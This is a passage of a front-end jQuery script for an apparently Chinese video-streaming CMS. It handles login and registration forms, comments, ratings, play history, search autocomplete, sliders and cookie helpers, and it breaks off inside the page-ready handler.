var zanpian = {
//浏览器信息
'browser':{
	'url': document.URL,
	'domain': document.domain,
	'title': document.title,
	'language': function(){
		try {
		  var ua = (navigator.browserLanguage || navigator.language).toLowerCase();//zh-tw|zh-hk|zh-cn
		  return ua;
		} catch (e) {}
	}(),
	'canvas' : function(){
		return !!document.createElement('canvas').getContext;
	}(),
	'useragent' : function(){
		var ua = navigator.userAgent;//navigator.appVersion
		return {
			'mobile': !!ua.match(/AppleWebKit.*Mobile.*/), //是否为移动终端 
			'ios': !!ua.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
			'android': ua.indexOf('Android') > -1 || ua.indexOf('Linux') > -1, //android终端或者uc浏览器 
			'iPhone': ua.indexOf('iPhone') > -1 || ua.indexOf('Mac') > -1, //是否为iPhone或者QQHD浏览器 
			'iPad': ua.indexOf('iPad') > -1, //是否iPad
			'trident': ua.indexOf('Trident') > -1, //IE内核
			'presto': ua.indexOf('Presto') > -1, //opera内核
			'webKit': ua.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
			'gecko': ua.indexOf('Gecko') > -1 && ua.indexOf('KHTML') == -1, //火狐内核 
			'weixin': ua.indexOf('MicroMessenger') > -1 //是否微信 ua.match(/MicroMessenger/i) == "micromessenger",			
		};
	}()
},
//系统公共
'cms': {
	//提示窗口
	'floatdiv': function() {
		$("<link>").attr({
			rel: "stylesheet",
			type: "text/css",
			href: cms.public + "mstyle/showfloatdiv/css/showfloatdiv.css"
		}).appendTo("head");
		$.getScript(cms.public + "mstyle/showfloatdiv/js/showfloatdiv.js", function() {});
	},
	//AJAX模态弹窗加载
	'modal': function(url){
		$('.zanpian-modal').modal('hide');
		$(".modal-dialog .close").trigger('click');//先关闭窗口
		$('.zanpian-modal').remove();
		$('.modal-backdrop').remove();
		$.ajax({
			type: 'get',
			cache: false,
			url: url,
			timeout: 3000,
			success: function($html) {
				$('body').append($html);
				$('.zanpian-modal').modal('show');
			}
		})
	},
	//公共
	'all': function(url){
		$('body').on("click", "#login,#user_login", function(event){
			$('.zanpian-modal').modal('hide');																	
			if(!zanpian.user.islogin()){
			   event.preventDefault();
			   zanpian.user.loginform();
			   return false;
			}
		});
	},
	'playlist': function() {
		//更多播放地址切换
		$(".player-more .dropdown-menu li").click(function() {
			$("#playTab").find('li').removeClass('active');
			var activeTab = $(this).html();
			var prevTab = $('.player-more').prev('li').html();
			$('.player-more').prev('li').addClass('active').html(activeTab);
			//var prevTab = $('#playTab li:nth-child(2)').html(); 
			//$('#playTab li:nth-child(2)').addClass('active').html(activeTab);		   
			$(this).html(prevTab);
		});
		if ($('.player-more').length > 0) {
			$(".dropdown-menu li.active").each(function() {
				var activeTab = $(this).html();
				var prevTab = $('.player-more').prev('li').html();
				$('.player-more').prev('li').addClass('active').html(activeTab);
				$(this).html(prevTab).removeClass('active');
			});
		}	
		var WidthScreen = true;
		for (var i = 0; i < $(".playlist ul").length; i++) {
			series($(".playlist ul").eq(i), 20, 1);
		}
		function series(div, n1, n2) { //更多剧集方法
			var len = div.find("li").length;
			var n = WidthScreen ? n1 : n2;
			if (len > 24) {
				for (var i = n2 + 18; i < len - ((n1 / 2) - 2) / 2; i++) {
					div.find("li").eq(i).addClass("hided");
				}
				var t_m = "<li class='more open'><a target='_self' href='javascript:void(0)'>更多剧集</a></li>";
				div.find("li").eq(n2 + 17).after(t_m);
				var more = div.find(".more");
				var _open = false;
				div.css("height", "auto");
				more.click(function() {
					if (_open) {
						div.find(".hided").hide();
						$(this).html("<a target='_self' href='javascript:void(0)'>更多剧集</a>");
						$(this).removeClass("closed");
						$(this).addClass("open");
						$(this).insertAfter(div.find("li").eq(n2 + 17));
						_open = false;
					} else {
						div.find(".hided").show();
						$(this).html("<a target='_self' href='javascript:void(0)'>收起剧集</a>");
						$(this).removeClass("open");
						$(this).addClass("closed");
						$(this).insertAfter(div.find("li:last"));
						_open = true;
					}
				})
			}
		}
	}
},
'updown': { //顶踩与送花
	'load': function() {
			$('body').on("click", "#up,#down,#flower,#digg", function() {
			$.showfloatdiv({
					txt: '数据提交中...',
					cssname: 'loading'
			});
			var obj = $(this);	
			$.ajax({
			type: 'post',
			data: {'id':$(this).data("id"),'sid':$(this).data("sid"),'type':$(this).data("type"),'name':$(this).data("name")},
			dataType:'json',
			cache: false,
			url: cms.root + "index.php?s=/home/digg/index",
			timeout: 3000,
			success: function(r){
					$.hidediv(r);
					if (parseInt(r.code) > 0){
						count=obj.find('#count').text()*1+1;
						obj.find('#count').text(count);
						obj.find('#count').attr('data-count',count)
					}
				}});
			});
		$("#flower").hover(function() {
			$(this).find("#count").text("送花");
		}, function() {
			var count = $(this).find("#count").attr("data-count")
			$(this).find("#count").text(count);
		});

	},
},
'love': {//订阅与收藏
	'load': function() {
		$(".user-bt").each(function() {
			var a = $(this).find(".sect-btn"),
				b = $(this).find(".cancel"),
				c = $(this).find(".sect-show");
			    a.click(function(){
				if(!zanpian.user.islogin()){zanpian.user.loginform();return false;}
				$.showfloatdiv({
					txt: "数据提交中...",
					cssname: "loading"
				});
				var d = $(this);
				$.ajax({
			      type: 'get',
			      cache: false,
			      url: cms.root + "index.php?s=/home/ajax/mark/type/"+a.attr("data-type")+"/id/" + a.attr("data-id")+"/cid/"+a.attr("data-cid"),
			      timeout: 3000,
			      success: function(a) {
					$.hidediv(a), parseInt(a.code) > 0 ? (d.hide(), c.show(), b.show()) : parseInt(a["yjdy"]) > 0 && 1 == parseInt(a["yjdy"]) && (d.hide(a), c.show(), b.show())
				}})
			}), b.click(function() {
				$.showfloatdiv({
					txt: "数据提交中...",
					cssname: "loading"
				}),$.ajax({
			      type: 'get',
			      cache: false,
			      url: cms.root + "index.php?s=/home/ajax/mark/type/"+a.attr("data-type")+"/id/" + a.attr("data-id")+"/cid/"+a.attr("data-cid"),
			      timeout: 3000,
			      success: function(b){
					$.hidediv(b), parseInt(b.code) > 0 && (a.show(), c.hide())
				}})
			})
		})

	},		
},
//评分
'score': {
	'load': function() {
		 if ($('#zanpian-score').length > 0 && $('#zanpian-cm').length<=0) {
		   zanpian.score.ajax(cms.root + "index.php?s=/home/ajax/gold/id/" + $('#zanpian-score').data('id')+"/sid/"+$('#zanpian-score').data('sid'))
		 }
	},
	'loading': function() {
		  if ($('#zanpian-score').length > 0) {
		   zanpian.score.ajax(cms.root + "index.php?s=/home/ajax/gold/id/" + $('#zanpian-score').data('id')+"/sid/"+$('#zanpian-score').data('sid'))
		 }
	},	
     //加载评分与订阅收藏
    'ajax':function(url){
         $.ajax({
			url: url,
			cache: false,
			timeout: 3000,
			success: function(data) {
				if (data.gold != undefined && data.gold != null) {
					zanpian.score.stars(data.gold);
				};
			}
			});
		 return false;
	},
	'stars':function(r){
		if($("#rating")) {
			$("ul.rating li").each(function() {
				var b = $(this).attr("title"),
					c = $("ul.rating li"),
					d = $(this).index(),
					e = d + 1;
				$(this).click(function() {
					hadpingfen > 0 ? ($.showfloatdiv({
						txt: "已经评分,请务重复评分"
					}), $.hidediv({})) : ($.showfloatdiv({
						txt: "数据提交中...",
						cssname: "loading"
					}), c.removeClass("active"), $("ul.rating li:lt(" + e + ")").addClass("active"), $("#ratewords").html(b),$.post(cms.root + "index.php?s=/home/ajax/addgold",{
						val: $(this).attr("val"),
						id: cms.id,
						sid: cms.sid
					},function(a) {
						if (parseInt(a.code) == 1) {
							$.ajax({
								type: 'get',
								cache: false,
								timeout: 3000,
								url: cms.root + "index.php?s=/home/ajax/gold/id/" + cms.id +"/sid/"+ cms.sid,
								success: function(data) {
									zanpian.score.stars(data.gold);
								}
							});
						}
						parseInt(a.code) > 0 ? ($.hidediv(a), loadstat(), hadpingfen = 1) : -2 == parseInt(a.code) ? (hadpingfen = 1, $.showfloatdiv({
							txt: "已经评分,请务重复评分"
						}), $.hidediv({})) : ($.closefloatdiv(), $("#innermsg").trigger("click"))

					}, "json"))
				}).hover(function(){
					this.myTitle = this.title, this.title = "", $(this).nextAll().removeClass("active"), $(this).prevAll().addClass("active"), $(this).addClass("active"), $("#ratewords").html(b)
				}, function() {
					this.title = this.myTitle, $("ul.rating li:lt(" + e + ")").removeClass("hover")

				})
			}), $(".rating-panle").hover(function() {
				$(this).find(".rating-show").show()
			}, function() {
				$(this).find(".rating-show").hide()
			})
		}		
		var hadpingfen = 0;
		var curstars = parseInt(r.mygold);
		$("#pa").html(r['curpingfen'].a + "人");
		$("#pb").html(r['curpingfen'].b + "人");
		$("#pc").html(r['curpingfen'].c + "人");
		$("#pd").html(r['curpingfen'].d + "人");
		$("#pe").html(r['curpingfen'].e + "人");
		$("#vod_gold").html(r['curpingfen'].pinfen);
		var totalnum = parseInt(r['curpingfen'].a) + parseInt(r['curpingfen'].b) + parseInt(r['curpingfen'].c) + parseInt(r['curpingfen'].d) + parseInt(r['curpingfen'].e);
		if (totalnum > 0) {
			$("#pam").css("width", ((parseInt(r['curpingfen'].a) / totalnum) * 100) + "%");
			$("#pbm").css("width", ((parseInt(r['curpingfen'].b) / totalnum) * 100) + "%");
			$("#pcm").css("width", ((parseInt(r['curpingfen'].c) / totalnum) * 100) + "%");
			$("#pdm").css("width", ((parseInt(r['curpingfen'].d) / totalnum) * 100) + "%");
			$("#pem").css("width", ((parseInt(r['curpingfen'].e) / totalnum) * 100) + "%")
		};
		if (r['hadpingfen'] != undefined && r['hadpingfen'] != null) {
			hadpingfen = 1;
		}
		var PFbai = r['curpingfen'].pinfen * 10;
		if (PFbai > 0) {
			$("#rating-main").show();
			$("#rating-kong").hide();
			$("#fenshu").animate({
				'width': parseInt(PFbai) + "%"
			});
			$("#total").animate({
				'width': parseInt(PFbai) + "%"
			});
			$("#pingfen").html(r['curpingfen'].pinfen);
			$("#pingfen2").html(r['curpingfen'].pinfen);

		} else {
			$("#rating-main").hide();
			$("#rating-kong").show();
			$(".loadingg").addClass('nopingfen').html('暂时没有人评分，赶快从左边打分吧！');
		};
		if (r['loveid'] != null) {
			$("#love").hide();
			$("#yeslove").show();
		} else {
			$("#love").show();
			$("#yeslove").hide();
		}
		if (r['remindid'] != null) {
			$("#remind").hide();
			$("#yesremind").show();
		} else {
			$("#remind").show();
			$("#yesremind").hide();
		}
		if (curstars > 0) {
			var curnum = curstars - 1;
			$("ul.rating li:lt(" + curnum + ")").addClass("current");
			$("ul.rating li:eq(" + curnum + ")").addClass("current");
			$("ul.rating li:gt(" + curnum + ")").removeClass("current");
			var arr = new Array('很差', '较差', '还行', '推荐', '力荐');
			$("#ratewords").html(arr[curnum]);
		}      
	},

},
//播放记录
'playlog': {
	'load': function() {
		zanpian.playlog.set();
		zanpian.playlog.get();
	},
	'get': function() {
		if ($("#user_playlog").eq(0).length) {
			$.ajax({
				type: 'get',
				cache: false,
				url: cms.root + 'index.php?s=/home/playlog/get',
				timeout: 10000,
				success: function($html) {
					$(".playlog_list").html($html);
					zanpian.user.userinfo();
				}
			})
			$("#user_playlog").click(function(){
				$("#playlog_list").modal('show');
			});
			$('body').on("click", "#playlog-clear", function(){
				$.ajax({
			       type: 'get',
			       cache: false,
				   dataType:'json',
			       url: cms.root + 'index.php?s=/home/playlog/clear',
			       timeout: 10000,
			       success: function(data) {											 
					if (parseInt(data["rcode"]) > 0) {
						$(".looked-list").html("<ul><strong>暂无观看历史记录列表</strong></ul>");
					}
				}})
			});
			$('body').on("click", "#playlog-del", function(event) {
				event.preventDefault();
				$.post(cms.root + 'index.php?s=/user/playlog/del', {
					log_id: $(this).attr('data-id'),
					log_vid: $(this).attr('data-vid')
				}, function(data) {
					if (parseInt(data["rcode"]) > 0) {}
				}, "json")
				$(this).parent().remove();
			});
			$('body').on("click", "#playlog-close", function() {
				$('.playlog_list').stop(true, true).hide();
			});
		}
	},
	'set': function() {
		if ($(".playlog-set").eq(0).attr('data-pid')) {
			$.post(cms.root + "index.php?s=/home/playlog/set", {
				log_vid: $(".playlog-set").attr('data-id'),
				log_sid: $(".playlog-set").attr('data-sid'),
				log_pid: $(".playlog-set").attr('data-pid'),
				log_urlname: $(".playlog-set").attr('data-name'),
				log_maxnum: $(".playlog-set").attr('data-count')
			});
		}

	},
},
//评论
'cm': {
	//按类型加载评论
	'load':function(){
		if($('#zanpian-cm[data-type=zanpian]').length){
			this.forum();
		}
		if($('#zanpian-cm[data-type=uyan]').length){
			this.uyan();
		}
		if($('#zanpian-cm[data-type=changyan]').length){
			this.changyan();
		}
	},	
	'forum': function(){
		    var id=$("#zanpian-cm").data('id');
			var sid=$("#zanpian-cm").data('sid');
		    //如果同时需要评分并加载
		    if($('#zanpian-score').length > 0){
			   zanpian.cm.ajax(cms.root + "index.php?s=/home/ajax/get/id/" + id + "/sid/" + sid);
			}else{
			   zanpian.cm.ajax(cms.root + "index.php?s=/home/ajax/cm/id/" + id + "/sid/" + sid);	
			}
			zanpian.cm.emo();
			$("#subcomm").click(function(e){
				if(!zanpian.user.islogin()){zanpian.user.loginform();return false;}						 
				$("#commform").zanpiansub({
					curobj: $("#subcomm"),
					txt: '数据提交中,请稍后...',
					onsucc: function(result) {
						$.hidediv(result);
						if (parseInt(result['code']) > 0) {
							zanpian.cm.ajax(cms.root + "index.php?s=home/ajax/cm/id/" + id + "/sid/" + sid)
						}else{
							$('img.validate-img').attr("src",zanpian.image.validateurl());	
						}
						if(parseInt(result['code']) < -1){
							 zanpian.user.loginform();
							 return false;	
						}
					}
				}).post({
					url: cms.root + 'index.php?s=home/ajax/addcm/sid/'+sid+'/id/'+id
				});
				return false;
			});
			$("#cmt-input-tip .form-control").focus(function(){										 
				$("#cmt-input-tip").hide(),$("#cmt-input-bd").show(),$("#cmt-input-bd .ui-textarea").focus()
			})
			$("#comm_txt").focus(function(e){
					if(!zanpian.user.islogin()){zanpian.user.loginform();return false;}
			});
	},
	//评论表情
	'emo': function() {
		$.get(cms.public + 'cms/emots.html',function(data){
		$("#emots").html(data);
		$('body').on("click",".emotion",function(){
			var left = $(this).offset().left;
			var top = $(this).offset().top;
			var id = $(this).attr("data-id");
			$("#smileBoxOuter").css({
				"left": left,
				"top": top + 25
			}).show().attr("data-id", id)
		});
		$("#smileBoxOuter,.emotion").hover(function() {
			$("#smileBoxOuter").attr("is-hover", 1)
		}, function() {
			$("#smileBoxOuter").attr("is-hover", 0)
		});
		$(".emotion,#smileBoxOuter").blur(function() {
			var is_hover = $("#smileBoxOuter").attr("is-hover");
			if (is_hover != 1) {
				$("#smileBoxOuter").hide()
			}
		});
		$(".smileBox").find("a").click(function() {
			var textarea_id = $("#smileBoxOuter").attr("data-id");
			var textarea_obj = $("#reply_" + textarea_id).find("textarea");
			var textarea_val = textarea_obj.val();
			if (textarea_val == "发布评论") {
				textarea_obj.val("")
			}
			var title = "[" + $(this).attr("title") + "]";
			textarea_obj.val(textarea_obj.val() + title).focus();
			$("#smileBoxOuter").hide()
		});
		$("#smileBoxOuter").find(".smilePage").children("a").click(function() {
			$(this).addClass("current").siblings("a").removeClass("current");
			var index = $(this).index();
			$("#smileBoxOuter").find(".smileBox").eq(index).show().siblings(".smileBox").hide()
		});
		$(".comment_blockquote").hover(function() {
			$(".comment_action_sub").css({
				"visibility": "hidden"
			});
			$(this).find(".comment_action_sub").css({
				"visibility": "visible"
			})
		}, function() {
			$(".comment_action_sub").css({
				"visibility": "hidden"
			})
		})
		});
	},
	'ajax': function(url) {
		$.ajax({
			url: url,
			cache: false,
			timeout: 3000,
			success: function(data) {
				if (data!= ''){
					if ($('#datalist li').length > 3) $("html,body").animate({
						scrollTop: $("#datalist").offset().top - 130
					}, 1000);
					$("#comment").empty().html(data.comment);
					$("#commnum").html(jQuery('#comment-count',data.comment).html());
					$("#data").empty().html(data);
					if(zanpian.browser.language=='zh-hk' || zanpian.browser.language=='zh-tw'){
					    $(document.body).s2t();
					}
					$("#commnum").html(data.count);																
					$(".digg a").click(function(e) {										  
						var id = $(this).data('id');
						var type = $(this).data('type');
						suburl($(this).data('url'),$(this));
						return false;
					});
					$(".reply").click(function(e){
						var curid = $(this).attr('data-id');
						var curpid = $(this).attr('data-pid');
						var curtid = $(this).attr('data-tid');
						var curtuid = $(this).attr('data-tuid');
						var curvid = $(this).attr('data-vid');
						var cursid = $(this).attr('data-sid');
						if (!zanpian.user.islogin()) {
							zanpian.user.loginform();
							return false;
						} else {
							if ($("#rep" + curid).html() != '') {
								$("#rep" + curid).html('');
							} else {
								
								$(".comms").html('');
								$("#rep" + curid).html($("#commsub").html());
								$(".emotion,#smileBoxOuter").blur(function() {
									var is_hover = $("#smileBoxOuter").attr("is-hover");
									if (is_hover != 1) {
										$("#smileBoxOuter").hide()
									}
								});
								$("#rep" + curid + " #comm_pid").val(curpid); //顶级ID
								$("#rep" + curid + " #comm_id").val(curid); //回贴ID
								$("#rep" + curid + " #comm_tid").val(curtid); //回贴ID
								$("#rep" + curid + " #comm_tuid").val(curtuid); //回贴用户ID
								$("#rep"+ curid+ " #comm_sid").val(cursid);
								$("#rep"+ curid+ " #comm_vid").val(curvid);
								$("#rep" + curid + " #row_id").attr("data-id", curid)
								$("#rep" + curid + " .recm_id").attr("id", 'reply_' + curid)
								$("#rep" + curid + " .sub").unbind();
								$("#rep" + curid + " .sub").click(function(e) {
								if(!zanpian.user.islogin()){zanpian.user.loginform();return false;}										   
								$("#rep" + curid + " #comm-sub-form").zanpiansub({
										curobj: $("#rep" + curid + " .sub"),
										txt: '数据提交中,请稍后...',
										onsucc: function(result) {
											$.hidediv(result);
											if (parseInt(result['code']) > 0){
												zanpian.cm.ajax(url);
											}else{
												$('img.validate-img').attr("src",zanpian.image.validateurl());
											}
											if(parseInt(result['code']) < -1){
											       zanpian.user.loginform();
							                       return false;	
											}
											
										}
									}).post({
										url: cms.root + 'index.php?s=/home/ajax/addrecm'
									});
								});
							}
						}
					});
				} else {
					$("#datalist").html('<li class="kong">当前没有评论，赶紧抢个沙发！</li>');
				};
				
				if (data.gold != undefined && data.gold != null) {
				         zanpian.score.stars(data.gold);
			    };	
				$("#pages").html(data.pages);
				$("#pagetop").html(data.pagetop);
				$(".ajax-page ul a").click(function(e) {
					var pagegourl = $(this).attr('href');
					zanpian.cm.ajax(pagegourl);
					return false;
				});
			},
			dataType: 'json'
		});
		return false;
	},

},
'user': {
	'index': function() {
		zanpian.user.login();
		zanpian.user.reg();
		zanpian.user.home();			
	},	
	//检查登录状态
	'islogin': function() {
		islogin = 0;
		if (document.cookie.indexOf('auth_sign=') >= 0) {
			islogin = 1;
			return true;
		}
		return false;
	},
	//弹出登录窗口
	'loginform': function() {
		if (!zanpian.user.islogin()) {
			zanpian.cms.modal(cms.root + 'index.php?s=/home/ajax/login');
			zanpian.user.login();
		} else {
			return false;
		}
	},
	//登录
	'login': function() {
		$('body').on("click", "#login-submit", function(){									
			if ("" == $("#user_name").val()){$.showfloatdiv({
				txt: "请输入用户名手机或邮箱"
			}), $("#user_name").focus(), $.hidediv({});
			    return false;
			}
			else {
				if ("" != $("#user_password").val()) return $("#login-form").zanpiansub({
					curobj: $("#login-submit"),
					txt: "数据提交中,请稍后...",
					isajax: 1,
					onsucc: function(a) {
						if ($.hidediv(a), parseInt(a["code"]) > 0) {
							try {
								zanpian.playlog.get();
								zanpian.score.loading();
							} catch (e) {}
							setTimeout(function() {
								$(".modal-dialog .close").trigger('click');
							}, 500);
							window.location.reload();
						} else - 3 == parseInt(a["code"])
						$('img.validate-img').attr("src",zanpian.image.validateurl());
					}
				}).post({
					url: cms.root + "index.php?s=/user/login/index"
				}), !1;
				$.showfloatdiv({
					txt: "请输入密码"
				}), $("#userpassword").focus(), $.hidediv({})
			}
		})
	},
	'reg': function() {
		$('body').on("click", "#reg-submit", function() {	
			var ac = $('input[name="ac"]').val();	
			var to = $('input[name="to"]').val();										  
          	if ("" == $("#reg-form #user_name").val()){$.showfloatdiv({
		         txt: "请输入用户名"
	        }), $("#reg-form #user_name").focus(), $.hidediv({});
			    return false;
			}
			if(ac=='mobile'){
          	    if ("" == to){$.showfloatdiv({
		            txt: "请输入手机号码"
	            }), $('input[name="to"]').focus(), $.hidediv({});	
			       return false;
			    }				
                var pattern=/^[1][0-9]{10}$/;
                var ex = pattern.test(to);			
			    if (!ex) {$.showfloatdiv({
				   txt: "手机号格式不正确"
			    }), $('input[name="to"]').focus(), $.hidediv({});
			       return false;
			    }				
				
			}else if(ac=='email'){
          	    if ("" == to){$.showfloatdiv({
		            txt: "请输入邮箱"
	            }), $('input[name="to"]').focus(), $.hidediv({});	
			       return false;
			    }
                var pattern = /^([a-zA-Z0-9]+[_|\_|\.]?)*[a-zA-Z0-9]+@([a-zA-Z0-9]+[_|\_|\.]?)*[a-zA-Z0-9]+\.[a-zA-Z]{2,3}$/;
                var ex = pattern.test(to);
			    if (!ex) {$.showfloatdiv({
				   txt: "邮箱格式不正确"
			    }), $('input[name="to"]').focus(), $.hidediv({});
			       return false;
			    }			
			}	
			if ("" != $("#reg-form #user_password").val()) return $("#reg-form").zanpiansub({
				curobj: $("#reg-submit"),
				txt: "数据提交中,请稍后...",
				onsucc: function(a) {
					if ($.hidediv(a), parseInt(a["code"]) > 0) {
						try {
							zanpian.playlog.get();
						} catch (e) {}
						setTimeout(function() {
							$(".modal-dialog .close").trigger('click');
						}, 500);
					} else - 3 == parseInt(a["code"])
					$('img.validate-img').attr("src",zanpian.image.validateurl());
					return false;
				}
			}).post({
				url: cms.root + "index.php?s=/user/reg/index"
			}), !1;
			$.showfloatdiv({
				txt: "请输入密码"
			}), $("#reg-form #user_password").focus(), $.hidediv({})
		})
	},
	//注册
	'userinfo': function(){
		if(!zanpian.user.islogin()){
			return false;
		}	
		$.ajax({
			type: 'get',
			cache: false,
			url: cms.root + 'index.php?s=/user/center/flushinfo',
			timeout: 10000,
			success: function(a) {
				
				return -7 == parseInt(a.code) ? ($.showfloatdiv({
					txt: a.msg,
					classname: "error"
				}), $.hidediv({
					code: -1,
					msg: a.msg
				}), !1) : (a.uid > 0 && (parseInt(a.history) > 10 ? ($("#playlog-todo").html('<a target="_blank" href="' + cms.root + 'index.php?s=/user/center/playlog">进入会员中心查看' + a.history + '条播放记录&gt;&gt;</a>'), $("#playlog-todo").show()) : ($("#playlog-todo").html(""), $("#playlog-todo").hide()), loginhtml = $("#navbar_user_login,#user_login").html(), $("#navbar_user_login,#user_login").html(a.html), $("#nav-signed").hide(), $(".logoutbt").unbind(), $('#navbar_user_login .nav-link').removeAttr("href"), $('#navbar_user_login').click(function() {
					$('.user-search,#example-navbar-collapse').hide();
					$(this).children('#nav-signed').toggle();
				}), $('#user_login').hover(function() {
					
				}, function() {
					
				}), $(".logoutbt").click(function(event) {
					event.stopPropagation();
					$.showfloatdiv({
						txt: '数据提交中...',
						cssname: 'loading'
					});
					$.get(cms.root + "index.php?s=/home/ajax/logout", function(r) {
						if ($.hidediv(r), parseInt(r["code"]) > 0) {
							$("#navbar_user_login,#user_login").html(loginhtml);
							zanpian.playlog.get();
							$("#love,#remind").show();
                            $("#yeslove,#yesremind").hide();
						}
					}, 'json');
				})))
			}
		})
	},
	'home': function() {
		$('body').on("click", ".user-home-nav ul a",function(){
				var url = $(this).attr("data-url");
				if(url){
				var txt=$(this).text();
				$(this).parents().find('li').removeClass('active');
				$(this).parent('li').addClass('active');
				$("#tab_title").text(txt);
				if($(this).attr("data-id")=='cm'){
				    zanpian.cm.ajax(url);
					zanpian.cm.emo();
				}else{
					zanpian.user.get(url);
				}}
		})
	},
},	
'gbook': { 
    //留言
	'load': function() {
		$('body').on("click", "#gb_types li",function(e){
        $("#gb_types li").each(function(){
            $(this).removeClass('active');
        });
        $(this).addClass('active');
        $("#gb_type").val($(this).attr('val'));
        });		
		$('body').on("click", "#gb-submit", function(){
			if ($("#gb_nickname").val() == '') $.showfloatdiv({
				txt: "请输入您的昵称"
			}), $("#gb_nickname").focus(), $.hidediv({});
			else {										 
			if ("" != $("#gb_content").val()) return $("#gbook-form").zanpiansub({
				curobj: $("#gb-submit"),
				txt: "数据提交中,请稍后...",
				onsucc: function(a) {
					if ($.hidediv(a), parseInt(a["code"]) > 0) {
					  zanpian.list.url(cms.root + "index.php?s=/home/gb/show");
					} else - 3 == parseInt(a["code"])
				}
			}).post({
				url: cms.root + "index.php?s=/home/gb/add"
			}), !1;
			$.showfloatdiv({
				txt: "输入留言内容"
			}), $("#gb_content").focus(), $.hidediv({})
		}
		})
	},
},
'search': { //搜索
	'autocomplete': function(){
		var $limit = $('.zanpian_search').eq(0).attr('data-limit');
		if( $limit > 0){
			$.ajaxSetup({
				cache: true
			});
			$.getScript("https://cdn.staticfile.org/jquery.devbridge-autocomplete/1.2.26/jquery.autocomplete.min.js", function(response, status) {
				$ajax_url = cms.root+'index.php?s=/home/search/vod';
				$('.zanpian_wd').autocomplete({
					serviceUrl : $ajax_url,
					params: {'limit': $limit},
					paramName: 'q',
					maxHeight: 400,
					transformResult: function(response) {
						var obj = $.parseJSON(response);
						return {
							suggestions: $.map(obj.data, function(dataItem) {
								return { value: dataItem.vod_name, data: dataItem.vod_url};
							})
						};
					},
					onSelect: function (suggestion) {
						location.href = suggestion.data;
						//alert('You selected: ' + suggestion.value + ', ' + suggestion.data);
					}
				});
			});
		}
		$(".aHeaderSearch").click(function(){
			$(".searchPop").show();
		});
		$(".cancelInput1").click(function(){
			$(".searchPop").hide();
		});
		$('.aChannel').click(function(){
			if($('.headerChannelList').is(':hidden')){
				$('.headerChannelList').show();
				$( this ).addClass( "aChannelShow" )
			}else{
				$('.headerChannelList').hide();
				$( this ).removeClass( "aChannelShow" )
			}  
		})
	},

},
//图片处理
'image': {
	//幻灯与滑块
	'swiper': function(){	
	    $.ajaxSetup({
			cache: true
		});
		$.getScript("//cdn.staticfile.org/Swiper/3.4.2/js/swiper.min.js", function() {
				
				new Swiper('.topnav', {
					pagination: ".swiper-pagination",
					lazyLoading: !0,
					preventClicks: !0,
					paginationClickable: !0,
					autoplayDisableOnInteraction: !1,
					autoplay: 3e3,
					loop: !0
				})
				,$("#headerTopNav li").each(function(a) {
					$(this).hasClass("active") ? new Swiper("#headerTopNav", {
						freeMode: !0,
						slidesPerView: "auto",
						initialSlide: a
					}) : new Swiper("#headerTopNav", {
						freeMode: !0,
						slidesPerView: "auto"
					})
				});
				var swiper = new Swiper('.slider', {
					pagination:'.swiper-pagination',
					lazyLoading:true,
					preventClicks:true,
					paginationClickable:true,
					autoplayDisableOnInteraction:false,
					autoplay:3000,
					loop:true,
					nextButton:'.swiper-button-next',
					prevButton:'.swiper-button-prev',
				});
			});
	},
	//延迟加载
	'lazyload': function(){
		$.ajaxSetup({
			cache: true
		});
		$.getScript("//cdn.staticfile.org/jquery_lazyload/1.9.7/jquery.lazyload.min.js", function(response,status){
			$(".loading").lazyload({
				effect : "fadeIn",
				failurelimit: 15
			}); 
		});
	},	
	//生成验证码图片
	'validate':function(){
		return '<label><img class="validate-img" src="'+cms.root +'index.php?s=/home/verify/index/' + Math.random()+'"></label>';
	},
	//生成验证码图片
	'validateurl':function(){
		return cms.root +'index.php?s=/home/verify/index/' + Math.random();
	},	
},
//验证码相关
'validate': {
	'load': function(){
		zanpian.validate.focus();
		zanpian.validate.click();
	},
	'focus': function(){//验证码框焦点
		$('body').on("focus", "#zanpian-validate", function(){
			$('#validate-zanpian,#validate-zanpian-reg').html(zanpian.image.validate()); 												
			$(this).unbind();
		});
	},
	'click': function(){//点击刷新
		$('body').on('click', 'img.validate-img', function(){
			$(this).attr("src",zanpian.image.validateurl());
		});
	}
},
//人气处理
'hits':{
	'load': function(){
		$(".detail-hits").each(function(i){
			var $this = $(".detail-hits").eq(i);
			$.ajax({
				url: cms.root+'index.php?s=/home/hits/show/id/'+$this.attr("data-id")+'/sid/'+$this.attr("data-sid")+'/type/'+$this.attr("data-type"),
				cache: true,
				dataType: 'json',
				success: function(data){
					$type = $this.attr('data-type');
					if($type != 'insert'){
						$this.html(eval('(data.' + $type + ')'));
					}
					$("#detail-hits").html(eval('(data.' + $("#detail-hits").attr('data-type') + ')'));
				}
			});
	 });
	}
},
'mobile':{
	'jump': function(){
		if( cms.pcurl && (zanpian.browser.url != cms.pcurl) ){
			 location.replace(cms.pcurl);
		}
	},
},
'Cookie':{
	'Set': function(name,value,days){
		var exp = new Date();
		exp.setTime(exp.getTime() + days*24*60*60*1000);
		var arr=document.cookie.match(new RegExp("(^| )"+name+"=([^;]*)(;|$)"));
		document.cookie=name+"="+encodeURIComponent(value)+";path=/;expires="+exp.toUTCString();
	},
	'Get': function(name){
		var arr = document.cookie.match(new RegExp("(^| )"+name+"=([^;]*)(;|$)"));
		if(arr != null){ return decodeURIComponent(arr[2]); return null; }
	},
	'Del': function(name){
		var exp = new Date();
		exp.setTime(exp.getTime()-1);
		var cval = this.Get(name);
		if(cval != null){ document.cookie = name+"="+encodeURIComponent(cval)+";path=/;expires="+exp.toUTCString(); }
	}
},
};
$(document).ready(function(){
if(!zanpian.browser.useragent.mobile){
	zanpian.mobile.jump();
}else{
